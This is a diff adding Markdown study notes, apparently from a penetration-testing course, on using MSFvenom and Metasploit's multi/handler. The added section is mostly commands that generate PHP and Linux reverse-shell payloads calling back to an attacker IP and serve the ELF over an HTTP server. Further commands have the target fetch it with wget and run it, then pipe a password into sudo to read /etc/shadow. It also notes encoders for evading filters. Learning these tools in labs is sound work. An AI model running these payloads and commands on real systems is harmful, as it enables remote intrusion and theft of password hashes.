@@ -182,3 +182,112 @@ $ use payload 30
 $ cd /
 $ hashdump
 ```
+
+### MSFvenom
+Msfvenom is a tool that creates malicious payloads. It will allow us to access all payloads available in Metasploit framework. Also it allow us to create payloads in many different formats (PHP, dll,elf,exe etc) and for many different target systems (Windows, Linux, Apple, Android etc).
+
+**3 main things it does:**
+- Create payloads -> generate executable code (reverse shells, meterpreter shells etc)
+- Multiple formats -> Can output as .exe, .elf, .php, .py etc
+- Multiple targets -> Workds for windows, linux, andorid, apple etc
+
+
+**Supported formats and platforms:**
+
+| OS | Output formats |
+|---|---|
+| Windows | .exe |
+| Linux | .elf |
+| Android | .apk |
+| IIS web servers | .asp |
+
+Raw scripting formats:- Python, PHP, Javascript, C, Perl.
+
+
+**List supported options**
+```bash
+msfvenom -l payloads         # List payloads
+msfvenom --list formats      # List formats
+msfvenom --list encoders     # listing encoders
+```
+
+**Encoders:**
+Encoders encode payload bytes to bypass bad characters or simple filters. Modern Antivirus detection often requires specialized obfuscation technique rather than basic encoding alone.
+
+### Generate payload for PHP 
+**Step 1: Generate payload with MSFvenom**
+```bash
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=7777 -f raw > shell.php
+```
+Here `-p` is for payload type (php/reverse_php), LHOST for machine IP of attacker with LPORT (7777), `-f` tells for output formats (raw, exe, elf etc), `>` saves in a file.
+
+**Step 2: Start a listener (MultiHandler)**
+```bash
+msf6> use exploit/multi/handler
+msf6> set payload php/reverse_php
+msf6> set lhost <Your_IP>
+msf6> set lport 7777
+msf6> run
+```
+This waits for the target to connect back to our machine.
+
+**Step 3: Execute payload on the target**
+Upload the generated `shell.php` to target and execute it.
+
+**Step 4: Get shell**
+When target runs the payload, it connects back to our listener and we get a shell.
+
+
+
+### Common payloads:
+- Windows: windows/meterpreter/reverse_tcp → generates .exe file
+- Linux: linux/x86/meterpreter/reverse_tcp → generates .elf file
+- PHP: php/reverse_php → generates .php file (for web servers)
+- Python: cmd/unix/reverse_python → generates .py file
+
+
+### TARGET : LINUX/x86 machine
+Now we want to gain reverse shell on target machine which is a linux/x86 machine.
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=7777 -f elf > rev_shell.elf     # Generate Linux ELF payload
+```
+
+Start a python server on attacker machine to get the file from victim machine.
+```python
+python3 -m http.server 9000
+```
+
+Prepare and launch the attack
+```bash
+msfconsole -q
+msf6> use exploit/multi/handler
+msf6 exploit(multi/handler)> set payload linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/handler)> set lhost <ATTACKER_IP>
+msf6 exploit(multi/handler)> set lport 7777
+msf6 exploit(multi/handler)> run
+```
+
+Execute on Target Machine
+```bash
+cd /tmp
+wget http://<ATTACKER_IP>:9000/rev_shell.elf
+chmod +x rev_shell.elf
+./rev_shell.elf
+```
+
+We will gain a meterpreter shell, after that we can use various commands to know about the system.
+```
+sysinfo
+getuid
+pwd
+ls
+```
+
+Privilege Escalation & Hash Dump inside Target Shell
+```
+shell
+echo "1q2w3e4r" | sudo -S -l
+echo "1q2w3e4r" | sudo -S cat /etc/shadow    # -S causes sudo to read the password from standard input instead of the terminal device
+``` 
+
